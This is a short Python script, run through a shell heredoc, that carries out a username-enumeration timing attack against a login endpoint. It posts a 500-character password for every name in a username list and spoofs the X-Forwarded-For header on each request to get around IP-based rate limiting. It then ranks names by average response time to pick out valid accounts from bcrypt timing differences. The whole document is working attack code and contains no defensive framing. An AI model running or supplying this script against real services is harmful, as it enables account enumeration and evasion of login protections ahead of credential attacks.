python3 - <<'EOF'
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "URL"
long_pass = "A" * 500  # longer = bigger bcrypt gap

with open("C:/Users/malik/Downloads/usernames.txt") as f:
    usernames = [line.strip() for line in f]

ip_counter = [0]

def check(username):
    ip_counter[0] += 1
    fake_ip = f"10.0.{ip_counter[0] // 255}.{ip_counter[0] % 255}"
    
    times = []
    for _ in range(3):  # 3 samples, take average
        start = time.time()
        requests.post(
            f"{base_url}/login",
            data={"username": username, "password": long_pass},
            headers={"X-Forwarded-For": fake_ip},
        )
        times.append(time.time() - start)
    
    avg = sum(times) / len(times)
    return username, avg

print("Running timing attack — this takes ~2 mins...")
results = {}
with ThreadPoolExecutor(max_workers=5) as ex:
    futures = {ex.submit(check, u): u for u in usernames}
    for f in as_completed(futures):
        username, avg = f.result()
        results[username] = avg

# Sort by slowest response
sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
print("\nTop 5 slowest (valid username is here):")
for u, t in sorted_results[:5]:
    print(f"  {u} → {t:.3f}s")
EOF
